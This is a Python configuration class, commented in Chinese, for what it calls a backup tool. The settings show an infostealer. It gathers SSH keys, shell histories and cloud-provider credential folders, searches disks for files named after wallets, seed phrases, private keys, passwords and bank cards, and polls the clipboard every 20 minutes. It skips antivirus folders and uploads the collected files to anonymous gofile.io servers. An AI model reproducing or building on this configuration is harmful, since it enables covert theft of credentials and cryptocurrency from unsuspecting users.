# -*- coding: utf-8 -*-

from pathlib import Path


class BackupConfig:
    """备份配置类"""
    
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）
    
    # 文件大小限制
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB 源目录最大大小
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB 压缩后单文件最大大小
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB 分片大小
    
    # 上传配置
    RETRY_COUNT = 3  # 重试次数
    RETRY_DELAY = 30  # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 1000  # 上传超时时间（秒）
    
    # 监控配置
    BACKUP_INTERVAL = 260000  # 备份间隔时间（约3天）260000
    CLIPBOARD_INTERVAL = 1200  # ZTB备份间隔时间（20分钟，单位：秒）1200
    
    # 超时配置
    WSL_BACKUP_TIMEOUT = 3600  # WSL备份超时时间（秒，1小时）
    DISK_SCAN_TIMEOUT = 600  # 磁盘扫描超时时间（秒，10分钟）
    NETWORK_CONNECTION_TIMEOUT = 3  # 网络连接超时时间（秒）
    PROGRESS_REPORT_INTERVAL = 60  # 进度报告间隔（秒）
    
    # 文件操作配置
    FILE_COPY_BUFFER_SIZE = 1024 * 1024  # 文件复制缓冲区大小（1MB）
    TAR_COMPRESS_LEVEL = 9  # tar压缩级别（0-9，9为最高压缩）
    COMPRESSION_RATIO = 0.7  # 压缩比例估计值（压缩后约为原始大小的70%）
    SAFETY_MARGIN = 0.7  # 安全边界（分块时留出30%的余量）
    
    # 日志配置
    LOG_FILE = str(Path.home() / ".dev/pypi_Backup/backup.log")
    
    # WSL指定备份目录或文件
    WSL_SPECIFIC_DIRS = [
        ".ssh",           # SSH配置
        ".bash_history",  # Bash历史记录
        ".python_history", # Python历史记录
        ".bash_aliases",  # Bash别名
        "Documents",      # 文档目录 - 已移除，以便其内容可以根据扩展名进行分类
        ".node_repl_history", # Node.js REPL 历史记录
        ".wget-hsts",     # wget HSTS 历史记录
        ".Xauthority",    # Xauthority 文件
        ".ICEauthority",  # ICEauthority 文件
        # VPS服务商配置目录
        ".aws",               # AWS配置
        ".gcloud",            # Google Cloud配置
        ".azure",             # Azure配置
        ".aliyun",            # 阿里云配置
        ".tencentcloud",      # 腾讯云配置
        ".tccli",             # 腾讯云CLI配置
        ".doctl",             # DigitalOcean配置
        ".hcloud",            # Hetzner配置
        ".vultr",             # Vultr配置
        ".linode",            # Linode配置
        ".oci",               # Oracle Cloud配置
        ".bandwagon",         # 搬瓦工配置
        ".bwg",               # 搬瓦工配置
        ".docker",            # Docker配置
        ".kube",              # Kubernetes配置
    ]
    
    # 关键字备份配置 - 备份包含以下关键字的文件和文件夹
    KEYWORD_BACKUP_KEYWORDS = [
        "wallet",
        "seed",
        "mnemonic",
        "private",
        "privkey",
        "keypair",
        "secret",
        "account",
        "password",
        "bank",
        "card",
        "solana",
        "important",
        "钱包",
        "助记词",
        "种子",
        "私钥",
        "密钥",
        "密码",
        "账户",
        "账号",
        "信用卡",
        "备忘",
        "重要",
    ]
    
    # WSL文件扩展名分类
    WSL_EXTENSIONS_1 = [  # 文档/代码类
        ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash", ".rs", ".env",
        ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md",
    ]
    
    WSL_EXTENSIONS_2 = [  # 配置和密钥类
        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config", ".conf", ".json",
        ".yaml", ".yml", ".toml", ".utc", ".gpg", ".pgp", ".wallet", ".keystore",
    ]
    
    # 磁盘文件分类
    DISK_EXTENSIONS_1 = [  # 文档类
        ".xls", ".xlsx", ".doc", ".docx", ".et", ".one", ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash",
        ".env", ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md",
    ]
    
    DISK_EXTENSIONS_2 = [  # 配置和密钥类
        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", ".conf", ".wallet", ".toml",
        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc", ".json", ".yml", ".yaml",   
    ]
    
    # 排除目录配置
    EXCLUDE_INSTALL_DIRS = [       
        # 游戏相关目录
        "Battle.net", "Riot Games", "GOG Galaxy", "Xbox Games", "Steam",
        "Epic Games", "Origin Games", "Ubisoft", "Games", "SteamLibrary",
        
        # 常见软件安装目录
        "Common Files", "WindowsApps", "Microsoft", "Microsoft VS Code",
        "Internet Explorer", "Microsoft.NET", "MSBuild",
        
        # 开发工具和环境
        "Java", "Python", "NodeJS", "Go", "Visual Studio", "JetBrains",
        "Docker", "Git", "MongoDB", "Redis", "MySQL", "PostgreSQL",
        "Android", "gradle", "npm", "yarn", ".npm", ".nuget",
        ".gradle", ".m2", ".vs", ".vscode", ".idea",
        
        # 虚拟机和容器
        "VirtualBox VMs", "VMware", "Hyper-V", "Virtual Machines",
        "docker", "containers", "WSL",
        
        # 其他大型应用
        "Adobe", "Autodesk", "Unity", "UnrealEngine", "Blender",
        "NVIDIA", "AMD", "Intel", "Realtek", "Waves",
        
        # 浏览器相关
        "Google", "Chrome", "Mozilla", "Firefox", "Opera",
        "Microsoft Edge", "Internet Explorer",
        
        # 通讯和办公软件
        "Discord", "Zoom", "Teams", "Skype", "Slack",
        
        # 多媒体软件
        "Adobe", "Premiere", "Photoshop", "After Effects", "Vegas", "MAGIX", "Audacity",
        
        # 安全软件
        "McAfee", "Norton", "Kaspersky", "Huorong",
        "Avast", "AVG", "Bitdefender", "ESET",
        
        # 系统工具
        "CCleaner", "WinRAR", "7-Zip", "PowerToys"
    ]
    
    # 关键词排除
    EXCLUDE_KEYWORDS = [
        # 软件相关
        "program", "software", "install", "setup", "update",
        "patch", "360", "cache", "Code",
        
        # 开发相关
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "bin", "obj", "packages",
        
        # 多媒体相关
        "music", "video", "movie", "audio", "media", "stream",
        
        # 游戏相关
        "steam", "game", "gaming", "save", "netease", "origin", "epic",
        
        # 其他
        "bak", "obsolete", "archive", "trojan", "clash", "vpn",
        "thumb", "thumbnail", "preview" , "v2ray", "mail"
    ]

    EXCLUDE_WSL_DIRS = [
        ".bashrc",
        ".bitcoinlib",
        ".cargo",
        ".conda",
        ".docker",
        ".dotnet",
        ".fonts",
        ".git",
        ".gongfeng-copilot",
        ".gradle",
        ".icons",
        ".jupyter",
        ".landscape",
        ".local",
        ".npm",
        ".nvm",
        ".orca_term",
        ".pki",
        ".pm2",
        ".profile",
        ".rustup",
        ".ssh",
        ".solcx",
        ".themes",
        ".thunderbird",
        ".wdm",
        "cache",
        "myenv",
        "snap",
        "venv",
        "node_modules",
        "dist",
        ".cache",
        ".config",
        ".vscode-server",
        "build",
        ".vscode-remote-ssh",
        ".git",
        "__pycache__",
    ]
    
    # 备用上传服务器
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]

